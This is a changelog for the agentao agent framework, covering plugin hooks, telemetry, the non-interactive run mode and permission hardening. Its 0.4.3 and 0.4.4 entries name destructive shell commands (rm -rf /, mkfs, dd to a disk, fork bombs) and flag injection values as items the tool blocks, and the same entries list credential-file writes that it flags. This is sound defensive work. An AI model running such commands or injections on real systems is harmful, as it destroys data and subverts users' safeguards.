  `docs/design/codex-reverse-review.md` (2026-05-17 follow-up).

- **`collect_full_plugin_diagnostics()` helper** (#45) in
  `agentao/embedding/plugins/diagnostics.py`. Shared by
  `agentao plugin list` and `agentao doctor` so the two commands cannot
  drift on which plugins they consider failed (it runs the post-load
  `resolve_plugin_entries` / `resolve_plugin_agents` simulation in
  addition to `PluginManager.load_plugins`).

- **`PreToolUse` plugin hooks are now decision-capable** (#39). A hook
  returning `hookSpecificOutput.permissionDecision: "deny"` cancels the tool
  call; `"ask"` flips the plan to the existing confirmation path; `"allow"`
  is a no-op. First `deny` wins, then first `ask`; hook decisions cannot
  override an engine `deny`/`ask`. The dispatch was moved to Phase 1.5 of
  `ToolRunner` so the new `PermissionDecisionEvent` precedes any tool
  `started` event (the ordering contract holds without an after-the-fact
  `cancelled`). A `PLUGIN_HOOK_FIRED` replay event with
  `hook_name: "PreToolUse"` is emitted for parity with the other hook sites.
  MVP supports only the JSON `hookSpecificOutput.permissionDecision` shape;
  exit-code-2 "block" parity, `additionalContext` injection into the model
  prompt, and `updatedInput` rewriting stay out of scope. Full design in
  `docs/design/codex-reverse-review.md`; tests in
  `tests/test_hooks_pre_tool_use_decision.py`.

- **Model latency / TTFT / per-turn tool count telemetry** (#41). Optional
  fields on existing transport/replay events — *no new event types, no
  public host-schema bump*:
  - `LLM_CALL_COMPLETED` now carries `model_latency_ms` (a stable
    intent-named alias of the existing `duration_ms`) and `first_token_ms`
    (TTFT — the monotonic timestamp of the first streamed text chunk
    minus call start; `None` for tool-only responses or failures before
    the first delta). Both the ok and error emit paths include them.
  - `TURN_END` carries `tool_count` (the per-turn count bumped after each
    tool batch in the chat loop); the replay adapter mirrors it onto the
    `TURN_COMPLETED` replay record.
  - Compaction duration was already covered: `CONTEXT_COMPRESSED` has long
    carried `duration_ms` and is now documented as the stable
    compaction-duration field.
  Hosts subscribe via the transport event stream (same path cost/usage
  tracking already uses). Not re-exposed on `agentao.host` Pydantic models
  yet — the host contract does not currently project LLM-call events, and
  adding that surface is a larger decision than this increment.

- **`/compact` manual-compaction command** (#38, #40). Runs full history
  compaction (`compress_messages(is_auto=False)`) on demand, without waiting
  for the auto-compaction threshold. Handler in
  `agentao/cli/commands/compact.py`; documented in `CLAUDE.md` and in
  `developer-guide/{en,zh}/cli/7-context-status.md`.

### Fixed

- **Empty final assistant content is no longer pushed into history** (#42).
  The chat loop used to append an empty assistant message when the model
  produced only a tool call and no text on the final iteration, leaving a
  malformed history entry that some providers reject on the next turn.

### Changed

- **`web_fetch` no longer silently falls back to crawl4ai.** The previous
  behavior auto-routed JS-rendered or failing fetches through a local
  headless browser whenever `crawl4ai` was installed — meaning a `[full]`
  install changed runtime behavior just by being present. The new model is
  opt-in via the `AGENTAO_WEB_FETCH_FALLBACK` env var:
  - `none` (default) — direct httpx fetch only; on a JS-detected page the
    static shell is returned with a `Note:` line telling the LLM the content
    is likely incomplete.
  - `jina` — falls back to [Jina Reader](https://r.jina.ai); the URL is sent
    to a third-party service, disclosed in the tool description and in a
    `Fallback: jina reader (https://r.jina.ai/<url>)` line on the result so
    the audit surface matches the actual outbound request.
  - `crawl4ai` — falls back to the local headless browser (requires
    `pip install agentao[crawl4ai]` and `playwright install chromium`).
  Rationale: the confirmation prompt and host-visible URL must match the
  actual outbound destination — silently proxying user-supplied URLs through
  a third party breaks the audit contract embedded hosts depend on.

### Added

- **`AGENTAO_WEB_FETCH_FALLBACK`** env var (values: `none` | `jina` |
  `crawl4ai`). Read once at `WebFetchTool` construction; invalid values log
  a warning and degrade to `none`.
- **`JINA_API_KEY`** env var (optional). When set, the Jina Reader fallback
  sends `Authorization: Bearer <key>` for higher rate limits.

### Internal

- `crawl4ai` import moved from module top to inside `_fetch_with_crawl4ai()`
  so `[full]` users no longer pay the Playwright/Chromium import cost on
  `web.py` import.

## [0.4.6] — 2026-05-08

A non-interactive automation release on top of 0.4.5. The new
`agentao run` subcommand is the headline; `agentao -p` is
reimplemented as a thin shim so both surfaces share one structured
result envelope and one exit-code table. **No public Python API or
wire-format change**, but `-p` callers that script on exit codes
must read the migration note below — `max_iterations` moved from
exit `2` to exit `4`, and exit `2` now means "invalid usage / spec
validation failed". Everything else upgrades in place via
`pip install -U agentao`.

### Added

- **`agentao run` subcommand (M0).** Structured automation surface:
  YAML/JSON spec on stdin or `--spec FILE`, merged with explicit
  CLI overrides, executed as one Agentao turn, emitting either the
  final assistant text (`--format text`) or one machine-readable
  envelope (`--format json`). The spec contract (`RunSpec` /
  `RunPermissionRule(s)` / `RunOutputOptions`) and the result
  envelope (`RunResult` / `RunErrorEnvelope` / `RunUsage`) are
  Pydantic models with `extra="forbid"`, so unknown spec fields
  fail loudly (exit `2`). `--spec` and piped stdin are mutually
  exclusive. Secrets (`api_key`) are never accepted in the spec —
  they stay in the environment or in a host-injected client.
  Inline `--prompt` is supported for ad-hoc callers who want
  structured output without a YAML file. Full M0 design captured in
  `docs/implementation/NON_INTERACTIVE_RUN_PLAN.{md,zh.md}` and
  documented for users in
  `developer-guide/{en,zh}/cli/12-non-interactive.md`.

- **Unified exit-code table for `agentao run` and `agentao -p`.**
  Both surfaces now exit `0` on success, `1` on runtime error, `2`
  on invalid usage / spec validation failure / unknown spec field,
  `3` on permission / interaction required (no interactive
  approval), `4` on max iterations, and `130` on SIGINT / SIGTERM.
  Implemented in `agentao/cli/run.py:_classify_outcome`.

- **Non-interactive transport (`agentao.transport.non_interactive`).**
  Records permission rejections, max-iteration hits, and
  interaction-required prompts as `RunErrorEnvelope` shapes the run
  pipeline can read off without touching `Agentao` internals.
  Composes `EventBroadcaster`, so the run pipeline can subscribe to
  `TOOL_COMPLETE` for the `tool_calls` counter.

- **`Agentao.add_event_observer` / `Agentao.remove_event_observer`.**
  Sync pass-throughs to `EventStream.add_observer` for consumers
  (notably the `agentao run` pipeline) that cannot drive the async
  `events()` iterator. The callback fires inline on the producer
  thread; `EventStream` swallows raised exceptions.

- **`EventStream._has_listeners()`.** Returns `True` when an async
  subscriber **or** a sync observer is attached. The narrower
  `_has_subscribers()` is kept for callers that care specifically
  about async-subscriber state.

- **§7.7 Multi-Agent Kanban Scheduling blueprint.** New cookbook
  chapter in Part 7 of the developer guide that anchors on the
  external derivative project
  [`jin-bo/agentao-kanban`](https://github.com/jin-bo/agentao-kanban).
  This is the first Part 7 blueprint that addresses the
  "many specialized agents as a system" shape rather than
  "embed one Agentao instance into a product"; it fills the gap
  that 7.1–7.6 leave open.

- **Plugin runtime/loader import-boundary contract test
  (`tests/test_plugin_boundary_contract.py`).** Imports
  `agentao.plugins` in a fresh subprocess and asserts that none of
  `agentao.embedding.plugins.{manager, manifest, diagnostics, mcp,
  resolvers}.*` and no YAML parser is pulled in transitively. Turns
  the runtime/loader split that landed in 5a/5b into an executable
  invariant rather than a convention. Documented under "Import map
  after 5a/5b" in `docs/design/core-boundary-review.{md,zh.md}`.

### Changed

- **`agentao -p` is now a thin shim** over
  `agentao run --format text --prompt …` (`run_print_mode` in
  `agentao/cli/entrypoints.py`). The success path
  (`prompt → final_text → exit 0`) and runtime-error path
  (exit `1`) are unchanged. The behavior delta is the exit code
  mapping listed above and the appearance of exit `3` for
  permission / interaction requirements that previously never
  surfaced from `-p` (it had no permission rejection path). Tests
  covering the delta are in `tests/test_run_subcommand.py`.

- **Spec-side permission rules layered on top of user rules.**
  `PermissionEngine` now accepts spec-injected `allow` / `deny`
  rules from `agentao run`'s spec without disturbing the existing
  project + user precedence. Action injection is isolated in
  `RunPermissionRule.to_engine_dict` so `extra="forbid"` can flatly
  reject hand-written `action:` fields in YAML.

- **Logger / `agentao.log` silencing knobs documented across the
  embedding entrypoints.** New canonical anchor at `docs/guides/embedding.md
  §2 → "Optional: silencing or redirecting agentao.log"` with a knob
  matrix and `Agentao(...)` / `LLMClient(...)` recipes; the rest of
  the doc set
  (`docs/guides/logging.md`, `developer-guide/{en,zh}/part-2/2-constructor-reference.md`,
  `developer-guide/{en,zh}/part-6/6-observability.md`) crosslinks
  to it. Pure documentation; the
  `LLMClient.__init__` short-circuit on `logger=` and the
  `log_file=None` knob both already exist.

### Deferred

Carried over from 0.4.5 unless noted:

- `--format jsonl` live event stream + a new `RunLifecycleEvent`
  type. Tracked in `NON_INTERACTIVE_RUN_PLAN.md` Post-MVP.
- Spec `attachments:` / `provider:` (multi-provider env-var prefix
  selection) / per-run `plugins:` fields. Same tracker.
- SIGINT-precise JSONL termination (M0 ships best-effort signal
  routing through `CancellationToken`).
- Session resume from `agentao run`.
- A checked-in JSON Schema snapshot for `RunSpec` / `RunResult`.
- `agentao.harness` deprecated alias removal — still scheduled for
  0.5.0.
- The eight legacy `Agentao(...)` callback kwargs — signature
  surgery scheduled for 0.5.0; they continue to emit a single
  `DeprecationWarning` per construction.
- `agentao/session.py` shim removal + `Path.cwd()` fallback removal
  — scheduled for 0.5.0.
- `PermissionEngine` legacy auto-load path tightening into a hard
  error.
- `bashlex`-based supersedence of the workspace-write
  sensitive-write preset's regex tier. Carried over from 0.4.3.
- PreCompact gate, `http`-type Stop hooks, plugin-hook events in
  the host public model, hook attachment pipeline. All carried
  over from 0.4.4.
- `docs/releases/v0.4.0.md` and `v0.4.1.md` backfill.

### Migration

- **`-p` callers that script on exit codes:** the only mapping that
  changed is `max_iterations`; if your CI checks
  `[ $? -eq 2 ]` to detect "answer may be incomplete", change it to
  `[ $? -eq 4 ]`. Treat `2` as "invalid usage / spec error" going
  forward. New exits `3` (permission / interaction) and `130`
  (SIGINT) are additive — they never appeared from `-p` before.
- **Hosts that build `PermissionEngine` from a spec-shaped object**
  can now pass `RunPermissionRule.to_engine_dict("allow"|"deny")`
  to get an engine-ready dict, or use the existing
  `PermissionEngine(rules=...)` ctor kwarg directly.
- **Hosts that don't want `agentao` to mutate their root logger**
  should pass `logger=` to `Agentao(...)` (or to `LLMClient` if
  building it directly). That single switch also silences the
  default `<wd>/agentao.log` file. See `docs/guides/embedding.md §2`.
## [0.4.5] — 2026-05-07

A core-boundary review release. Architectural cleanup of the embedded-host
boundary — replay state externalized from `Agentao`, persistent-session
module relocated, `PermissionEngine` file I/O extracted, plugin loader
relocated, and the legacy `Agentao(...)` callback surface formally
deprecated. **No breaking changes; no public API or wire-format change.**
`pip install -U agentao` upgrades in place from any 0.4.x release.

### Added

- **`Transport.subscribe(listener)`** — optional fan-out method on the
  `Transport` Protocol. Returns an idempotent unsubscribe callable;
  notify uses snapshot iteration so subscribing or unsubscribing
  mid-emit is safe; listener exceptions are swallowed and never poison
  the runtime emit path. `NullTransport` and `SdkTransport` provide it
  by composing `agentao.transport.EventBroadcaster` (also re-exported
  from `agentao.transport`) so from-scratch transports (ACP, message
  queues) can opt in the same way. Probe with
  `getattr(transport, "subscribe", None)` since bespoke implementations
  may omit it.

- **`TURN_BEGIN` / `TURN_END` event types** — fire **once per
  user-driven turn**, distinct from `TURN_START` (which fires once per
  LLM iteration inside the turn). `TURN_BEGIN` carries the user
  message; `TURN_END` carries final assistant text + `status` (`ok` /
  `error` / `cancelled`) + `error`. Replay recorders subscribe to these
  via `Transport.subscribe()` instead of being reached through agent
  state, removing the runtime-to-replay-adapter direct call path.

- **`agentao.embedding.permission_loader`** — new module hosting the
  on-disk loading of `permissions.json` (project + user scope, JSON
  parsing, env-var expansion). The `PermissionEngine` constructor now
  accepts `rules=` / `loaded_sources=` kwargs to skip disk reads
  entirely — relevant for embedded hosts that build rule sets
  programmatically. The legacy auto-load constructor path
  (`PermissionEngine(project_root=...)` without explicit `rules=`) is
  preserved via lazy delegation to the loader and is **not** deprecated
  in this release.

- **`agentao.embedding.sessions`** — new module hosting
  `save_session` / `load_session` / `list_sessions` /
  `delete_session` / `delete_all_sessions` and their helpers.
  `agentao/session.py` becomes a deprecation shim that wraps the new
  module with the old permissive signature
  (`project_root: Optional[Path] = None`, falling back to
  `Path.cwd()`); the new module's API will require `project_root`
  explicitly once the shim is removed in 0.5.0.

- **`agentao.embedding.plugins/*`** — plugin loader (`manager`,
  `manifest`, `diagnostics`, `mcp`, `resolvers/{skills,agents}`)
  relocated from `agentao/plugins/` to `agentao/embedding/plugins/`.
  `agentao/plugins/` is now runtime-only (validators + LLM-facing
  surfaces); the boundary between "what core needs at runtime" and
  "what the embedding layer needs to discover from disk" matches the
  rest of `agentao.embedding`.

- **`agentao.acp.schema_export`** — host-facing
  `export_host_acp_json_schema()` now lazy-delegates here so
  `agentao.host.schema` no longer eagerly imports `agentao.acp` at
  import time. Function signature, return type, and the snapshot at
  `docs/schema/host.acp.v1.json` are unchanged.

### Changed

- **Replay state externalized into `ReplayManager`.** The `Agentao`
  facade's replay surface (`replay_config` constructor kwarg + 4
  instance attributes + 6 facade methods + `close()` teardown leg) is
  consolidated behind `agentao.replay.manager.ReplayManager`. The
  recorder is now wired by `agentao.embedding.factory` as a
  `Transport.subscribe()` listener, so `chat_loop` no longer reaches
  into `agent._emit_*(...)` and `runtime/turn.py` /
  `runtime/llm_call.py` no longer read agent attributes directly. Six
  deprecated facade methods (`replay_*` etc.) and the
  `replay_config=` kwarg remain as back-compat shims; **scheduled
  removal in 0.5.0**. Touched: `agentao/agent.py`,
  `agentao/transport/{base,broadcast,events,null,sdk}.py`,
  `agentao/replay/{adapter,lifecycle,manager}.py`,
  `agentao/runtime/{turn,llm_call}.py`, `agentao/embedding/factory.py`,
  `agentao/acp/transport.py`.

- **Eight `Agentao(...)` legacy callback kwargs now emit a single
  `DeprecationWarning` per construction.** `confirmation_callback`,
  `step_callback`, `thinking_callback`, `ask_user_callback`,
  `output_callback`, `tool_complete_callback`, `llm_text_callback`,
  `on_max_iterations_callback` — passing any of them surfaces one
  warning that names all eight and points at
  `agentao.embedding.compat.build_compat_transport` as the documented
  migration path. Mixing `transport=` with legacy callbacks (which
  silently ignored the callbacks) now also emits a warning so the
  dead kwargs surface in test runs. Hosts that already pass
  `transport=SdkTransport(...)` or build a compat transport directly
  bypass the warning entirely. The kwargs themselves remain accepted;
  **scheduled removal in 0.5.0**.

- **Plugin validators split from resolvers.** `agentao/plugins/skills.py`
  and `agentao/plugins/agents.py` are now validators-only (runtime
  shape checks, LLM-facing surfaces); resolution (front-matter parsing,
  manifest reading, file discovery) moved to
  `agentao/plugins/resolvers/{skills,agents}.py`. Prerequisite for the
  loader relocation under `agentao/embedding/plugins/`.

- **Persistent-session module path migration.** Production import sites
  in `cli/{commands,session,replay_commands}.py` and
  `acp/session_load.py` now import from `agentao.embedding.sessions`
  and pass `project_root` explicitly. The legacy import path
  (`agentao.session.*`) keeps working through the wrapper shim;
  external test files migrate at 0.5.0 alongside the shim removal.

### Documentation

- **Developer guide — full CLI section ported.** New `cli/` subtree
  (12 chapters in `developer-guide/{en,zh}/cli/`) covering install,
  config, slash commands, sessions, replay, plugins, and the embedding
  cross-references. `developer-guide/index.md` hoisted to top; README
  slimmed to ~210 lines.

- **Developer guide §5.7 Plugin Hooks** — rule-author guide for the
  plugin-hook system (`UserPromptSubmit` / `SessionStart` /
  `SessionEnd` / `PreToolUse` / `PostToolUse` / `PostToolUseFailure` /
  `Stop` / `PreCompact`).

- **Developer guide §4.1 Transport Protocol** (en + zh) — full
  `Transport.subscribe()` section with semantics, probe-before-call
  recipe, and an `EventBroadcaster` composition example for from-scratch
  transports.

- **Developer guide §4.2 AgentEvent Reference** (en + zh) — event-group
  tree updated to wrap `TURN_START` inside the new `TURN_BEGIN` /
  `TURN_END` outer pair; per-event detail blocks added for the two new
  types with the per-turn-vs-per-iteration semantics call-out.

- **Developer guide §2.2 Constructor Reference** (en + zh) and
  **Appendix A API Reference** (en + zh) — legacy-callback collapsible
  relabeled "removed in 0.5.0"; new version-note entries for the
  0.4.x `DeprecationWarning` emission and the 0.5.0 planned
  signature surgery; `build_compat_transport` doc expanded to mark
  `agentao.embedding.compat` as the documented migration surface.

- **`docs/design/core-boundary-review.{md,zh.md}`** — full audit
  doc with verified reverse-import maps, codex baseline comparison,
  per-PR commit-hash backfills, and the priority-table execution log.
  This release ships PRs #1–#5b plus the #6 acp/ wheel-split boundary
  prep; #7 (`agentao.harness/` alias removal) remains scheduled for
  0.5.0.

### 0.5.0 runway (no action required for 0.4.x users)

The following surgeries are scheduled for **0.5.0** and deliberately
**not** shipped here:

- **Eight legacy callback kwargs** removed from the `Agentao(...)`
  signature. Migrate via `transport=SdkTransport(...)` or
  `agentao.embedding.compat.build_compat_transport(...)`.
- **`agentao/session.py` shim** removed; callers migrate to
  `agentao.embedding.sessions` with explicit `project_root=`. The
  shim's `Path.cwd()` fallback is removed at the same time.
- **`agentao.harness` alias** removed (carried over from 0.4.x —
  use `agentao.host` instead). One `DeprecationWarning` emitted on
  first import in 0.4.x.
- **Six `Agentao.replay_*` facade methods** plus the
  `replay_config=` constructor kwarg removed; embedded hosts that need
  the recorder wire it through `agentao.embedding.factory` (already
  the default since 0.4.5).

## [0.4.4] — 2026-05-06

A Claude-Code compatibility + tool-hardening release. **No breaking
changes; no public API or wire-format change.** `pip install -U agentao`
upgrades in place from any 0.4.x release.

### Added

- **`Stop` and `PreCompact` lifecycle hooks** — two new plugin-hook
  events alongside the six existing lifecycle events
  (`UserPromptSubmit`, `SessionStart`, `SessionEnd`, `PreToolUse`,
  `PostToolUse`, `PostToolUseFailure`). Wire shape is Claude Code's
  flat snake_case top-level payload — a hook script written against
  Claude Code's documented Stop / PreCompact stdin shape runs
  unchanged. Stop dispatches at three turn-end sites (`final_response`
  / `max_iterations` / `doom_loop`); PreCompact dispatches at four
  compaction sites (`microcompact`, `full` from `compression_threshold`
  or `api_overflow`, `minimal_history`). `select_matching_rules`
  filters `event + is_supported + _matches` and gates the
  `PLUGIN_HOOK_FIRED` emit so zero-match dispatch produces no event.
  Per-event hook-type allowlist (`SUPPORTED_HOOK_TYPES_BY_EVENT`)
  rejects `prompt`-type rules under Stop / PreCompact at parse time.
  Design rationale in
  `docs/implementation/STOP_PRECOMPACT_HOOKS_PLAN.{md,zh.md}`.

- **Stop control-aware gate** — Stop hooks honor Claude Code's full
  Stop output schema: exit code 2 (block + stderr-as-reason), JSON
  `decision: "block"` + `reason`, plus the documented common output
  fields (`continue`, `stopReason`, `suppressOutput`, `systemMessage`,
  `hookSpecificOutput.additionalContext`). The chat loop is wired at
  three exit sites (natural turn / max-iter / doom-loop) with a
  per-`chat()` re-entry cap to prevent infinite `force_continue`
  loops. `_dispatch_stop` returns a `StopHookResult` and a separate
  `_emit_stop_hook_fired` emits `PLUGIN_HOOK_FIRED` with the
  branch-specific outcome label. Schema additions on the Stop emit:
  `outcome ∈ {"allow", "block", "continue", "continue_at_max_iter",
  "reentry_capped"}`, `turn_end_reason` (discriminator for `continue`
  emits across the three exit sites), `added_context_count`,
  `suppress_output`. PreCompact stays observe-only; PreCompact gate
  is intentionally out of scope (see "Out of scope" below).

- **Edit tool — unicode-fuzzy tier-3 match** — `EditTool` gains a
  third match tier that maps typographic codepoints (smart quotes
  `“ ” ‘ ’`, em-/en-dash `—`/`–`, NBSP, ideographic space, …) to
  ASCII before line-window comparison, mirroring `git apply` fuzzy
  behaviour. Tiers 1 (byte-exact) and 2 (whitespace-flex) hit first;
  the shared `_line_window_matches` / `_apply_match` helpers preserve
  CRLF byte offsets and `replace_all` spans every normalized-equivalent
  occurrence. New `tests/test_edit_unicode_fuzzy.py` covers tier-3
  hits, `replace_all` across mixed dash variants, CRLF preservation,
  and tier-precedence (byte-exact and whitespace-flex must hit before
  tier 3).

### Changed

- **`SearchTextTool` argv hardening** — `_git_grep` now passes the
  pattern via `-e <pattern>` (git grep's `--` is the *pathspec*
  separator, not an option terminator); `_ripgrep` places the pattern
  after `--`. A user-supplied pattern beginning with `-` (`--help`,
  `--pre=...`, a leading `-e` payload) can no longer be parsed as a
  flag by the underlying engine. New
  `tests/test_search_argument_injection.py` covers both engines.

- **`SearchTextTool` rg source-level skip pruning** — `_ripgrep` now
  translates the effective `skip` set into `--glob '!<dir>'` flags so
  heavyweight directories (`node_modules`, `build`, `target`, …) are
  excluded by rg itself rather than post-filtered out of its output.
  Matters most in the non-git fallback path where there is no
  `.gitignore` to lean on. Negative globs are appended *after* the
  positive `file_pattern` glob because rg gives later globs precedence
  — a regression test locks in the ordering. `_effective_skip_dirs`
  opt-in semantics are preserved (a caller who explicitly references
  `node_modules` in their query still searches it).

### Fixed

- **Doom-loop turn finalizer no longer double-dispatches Stop.**
  Previously the `doom_triggered` branch dispatched Stop once and then
  `break`'d into the max-iter finalizer, which dispatched Stop a
  second time with the wrong `turn_end_reason`. The branch now
  finalizes the assistant message and returns directly. Pinned by
  `tests/test_hooks_stop_doom_loop_no_double_dispatch.py`.

- **Hook parser non-string trigger no longer raises.** `_regex_match_full`
  guards non-string trigger / value with an `isinstance` check so a
  malformed config degrades to no-match instead of raising
  `TypeError` from `re.fullmatch`.

### Documentation

- **`docs/implementation/STOP_PRECOMPACT_HOOKS_PLAN.{md,zh.md}`** —
  full two-phase plan with Claude Code compatibility matrix, payload
  shape, dispatcher signatures, replay-event projection, and
  `matched_rule_count` no-emit gate semantics.
- **Developer guide `part-4/2-agent-events.md`** (en + zh) — the
  `PLUGIN_HOOK_FIRED` row now lists `Stop` / `PreCompact` in the
  `hook_name` enumeration with per-name fields and the five-label
  Stop `outcome` matrix.
- **`docs/design/pi-mono-borrow-review.{md,zh.md}`** — reframed as
  Phase A event surface vs Phase B control-aware gate.
- **`docs/design/pi-mono-tools-review.{md,zh.md}`** — new decision
  record covering the Edit tier-3 match and Search argv hardening
  borrow candidates.

## [0.4.3] — 2026-05-04

A permission-hardening + LLM-resilience release. **No breaking changes;
no public API or wire-format change.** `pip install -U agentao` upgrades
in place from any 0.4.x release.

### Added

- **Hardline shell-safety floor** — a new
  `agentao/permissions_hardline.py` denies unrecoverable shell
  operations (`rm -rf /`, `mkfs`, `dd of=/dev/sda`, fork bombs,
  `shutdown`/`reboot`/`halt`, `init 0|6`, `systemctl poweroff|reboot`)
  *before* any rule — including `full-access` — is evaluated. The pattern
  set handles `sudo`/`env` wrappers (with flags and value args), quoted
  paths (`"$HOME"`, `'/etc/passwd'`), split rm flags (`-r -f`,
  `--recursive --force`), path-qualified `rm` (`/bin/rm`), `;`/`&&`/`||`
  + newline separators, and command substitution. Embedded hosts that
  take policy responsibility themselves can opt out via
  `PermissionEngine(enable_hardline=False)`. Decision results now carry
  a stable `reason` taxonomy (`hardline:*`, `mode-preset:*`,
  `user-rule:*`) that hosts can render in audit UIs without parsing
  free-form text. Design rationale in
  `docs/design/permission-hardening-plan.{md,zh.md}`.

- **Workspace-write sensitive-write preset** — a mode-scoped
  preset rule flags shell writes to `~/.bashrc`, `~/.zshrc`, `~/.netrc`,
  `~/.pgpass`, `~/.npmrc`, `~/.pypirc`, and friends via redirection
  (`>`, `>>`, `2>`), `tee`, `cp`/`mv`, or `sed -i`. The rule emits
  **ASK**, not DENY — installers (Homebrew, pyenv, rustup, nvm) and
  devops scripts legitimately edit these files, so the operator gets a
  prompt rather than a wall. `full-access` deliberately doesn't carry
  the rule (literal full access stays literal).

- **MCP `call_tool` error classification** — replaces "retry once on
  any failure" with explicit buckets (`AUTH`, `SESSION_EXPIRED`,
  `TRANSPORT_DROPPED`, `OTHER`). 401/403 surfaces immediately (no
  reconnect storm); session-expired and transport-dropped reconnect
  and retry once; everything else surfaces without reconnecting.
  `connection refused` is intentionally not classified as transport-
  dropped — the server isn't listening at all. The live transport is
  now disconnected before reconnecting so the old subprocess / SSE
  stream doesn't leak for the manager's lifetime. New
  `agentao.mcp.client.classify_mcp_error` + `McpErrorKind` are public.

- **Explicit LLM HTTP retry policy with progress-aware streaming** —
  `LLMClient` now controls retries end-to-end (the OpenAI SDK's built-
  in retry is disabled with `max_retries=0`):

  | Aspect | Behavior |
  |---|---|
  | Retryable | 429 + 5xx + connection errors |
  | Non-retryable | 4xx other than 429 |
  | Backoff | `Retry-After` if present (seconds or HTTP-date), capped at `MAX_BACKOFF_SECONDS`; otherwise jittered exponential |
  | Wall-clock budget | `MAX_TOTAL_RETRY_SECONDS` so a long `Retry-After` cannot strand the caller |
  | Cancellation | Sleeps run through `_interruptible_sleep`; a cancelled token aborts the loop immediately |
  | Streaming | `chat_stream` retries only **before** any chunk has reached `on_text_chunk` — once text is delivered, mid-stream errors propagate so retrying doesn't replay text the user already saw |

  Raised exceptions carry a `.streamed` flag so hosts (and the
  `LLM_CALL_COMPLETED` error event in `runtime/llm_call.py`) can pick
  between regenerate-from-scratch and resume-style retry without
  counting `LLM_TEXT` events themselves. Guards against the historical
  "upstream" substring matching `502` bodies and silently falling back
  to non-streaming, bypassing the retry policy.

- **Tightened config trust boundary** — three escalation paths closed
  (#25):

  1. `PermissionEngine` no longer loads project-scope
     `.agentao/permissions.json`. A checked-in
     `{"tool": "*", "action": "allow"}` would have defeated the user
     policy because the engine returns on the first matching rule. Only
     `<user_root>/permissions.json` is honored; a stray project file is
     logged once and ignored. Permissions are a user/host concern, not
     a cwd concern.
  2. Project `.agentao/mcp.json` is **add-only** — it may declare new
     server names but cannot override a user-scope entry with the same
     key. Collisions warn and skip. Prevents a checked-in `mcp.json`
     from silently redirecting a known name (e.g. `"github"`) to a
     different transport.
  3. `McpTool` surfaces MCP `readOnlyHint` / `destructiveHint`
     annotations as protocol hints — but only when the server is
     trusted, and only to **add** friction (`destructiveHint=true` →
     confirm anyway, regardless of `readOnlyHint`). Per spec, we never
     make tool-use decisions from annotations on untrusted servers.
     New `McpTool.mcp_annotations` property for host introspection.

- **`SearchTextTool` skip-list + ripgrep fallback** — kills the
  "effectively stuck on large trees" failure mode. Default-skips
  `.git`, `node_modules`, `.venv`/`venv`, `__pycache__`, `.tox`,
  `dist`, `build`, `target`, `.next`/`.nuxt`, and the usual language
  caches. Fallback chain becomes `git grep` → `rg` → Python, so
  non-git trees and Windows boxes with `rg.exe` but no `git` are
  rescued. Caller opts back in by naming a skip-dir in `directory` or
  `file_pattern`. Cross-platform via `shutil.which`; no
  `IS_WINDOWS` branching.

- **`/replay delete <id>` and `/replay delete all`** — mirrors
  `/sessions delete`. Removes specific replay files by id-prefix or
  wipes them all (single-key confirmation). The active recorder's file
  is skipped/refused so an in-flight write isn't orphaned.

- **`agentao.redact.mask_secret`** — canonical helper for hiding
  credentials in logs, audit events, and host UIs. Default shape
  `sk-A...3xZk` for long values, `********` (same length) for short
  values, `(not set)` for missing. Forward-looking: no internal
  callers migrated in this release; replaces the next ad-hoc
  truncation site that needs it.

- **Windows UTF-8 console enforcement** — `agentao/__init__.py`
  now calls `_ensure_utf8()` at package import. On Windows, sets
  `PYTHONIOENCODING=utf-8` (only if unset), switches the console
  code page to CP_UTF8 via `kernel32.SetConsoleOutputCP/SetConsoleCP`,
  and reconfigures `sys.stdin`/`stdout`/`stderr` with
  encoding=utf-8 + lenient error handler. POSIX is a single-instruction
  no-op. Embedded hosts that import Agentao from a Windows console
  no longer hit `UnicodeEncodeError` on CJK file paths, curly quotes
  from skill metadata, or model-output emoji.

### Fixed

- **`ToolExecutor` parallel batches now propagate contextvars** —
  `ThreadPoolExecutor` workers don't inherit the parent thread's
  context, so `contextvars.ContextVar` state set on the orchestration
  thread (host turn IDs, request metadata, structured-logging scopes)
  was lost when tools ran in parallel. Capture
  `contextvars.copy_context()` on the **parent** thread per submission
  and dispatch through `Context.run()` — calling `copy_context()`
  inside the worker would copy the worker's empty context. Each plan
  gets a fresh context (`Context.run()` may be invoked at most once per
  object).

- **MCP `destructiveHint=true` no longer bypasses read-only mode**
  when `readOnlyHint=true` is also set on the same trusted server. The
  conflict resolves security-positive: destructive wins. Caught by
  Codex review during #25's `/simplify` pass.

### Documentation

- **Developer guide §7.6 — WeChat bot blueprint** (mirrored to
  `examples/wechat-bot/`): a long-polling daemon that runs one Agentao
  turn per inbound message, with a `WeChatClient` Protocol that fits
  ilink / wechaty / itchat alike and a contact-scoped permission preset
  (allowlist → `WORKSPACE_WRITE`, otherwise `READ_ONLY`). Up-front
  contrast table draws a hard line between this personal-account path
  and the Official Account / Enterprise WeChat webhook track.
- **Host contract clarifications** — `EventStream.add_observer`
  fan-out documented; new `architecture/embedding-vs-acp.{md,zh.md}`
  decision tree distinguishing in-process embedding vs ACP server vs
  ACP client vs ACP schema surface; internal Transport / `AgentEvent`
  channel documented as a peer surface (`SdkTransport.on_event`) with
  full inventory and stability comparison; new
  `PUBLIC_EVENT_PROMOTION_PLAN.md` staging `MCPLifecycleEvent` and
  `LLMCallEvent` promotion to the stable contract.
- **`examples/protocol-injection/`** — runnable end-to-end sample
  replacing every host→Agentao injection slot with a small adapter
  (in-memory FileSystem, audit-logging ShellExecutor, dict-backed
  MemoryStore, programmatic MCPRegistry). Six smoke tests assert each
  slot is actually consulted; no `OPENAI_API_KEY` required. Wired into
  developer-guide Part 2.2 and Part 4.7.
- **`examples/personas/`** — new home for prompt-configuration
  samples (as opposed to host-integration code). Seeded with
  `daily-driver` (evidence-first daily assistant, citation-format
  table) and `kawaii-buddy` (情绪价值小助手 with mascot board).
- **`examples/skills/`** — host-agnostic skill gallery (#26):
  `zootopia-ppt`, `pro-ppt`, `ocr`, plus bilingual README explaining
  the three `SkillManager` discovery paths and the dual-placement
  story. Co-located skills in `data-workbench`, `ticket-automation`,
  and `batch-scheduler` now carry one-line callouts pointing back to
  the gallery and explaining why they can't be lifted out.
- **`docs/design/permission-hardening-plan.{md,zh.md}` rev 3** —
  status updated to mark PRs 1–5 all landed (PR 1 + PR 2 on
  2026-05-03; PR 3 + PR 4 + PR 5 on 2026-05-04). §10 reframed as
  post-ship follow-ups; only the `bashlex` supersedence of PR 5's
  regex tier remains open.
- **`docs/design/pi-mono-borrow-review.{md,zh.md}`** — decision
  record from surveying ~590 commits in `pi-mono` between v0.66 and
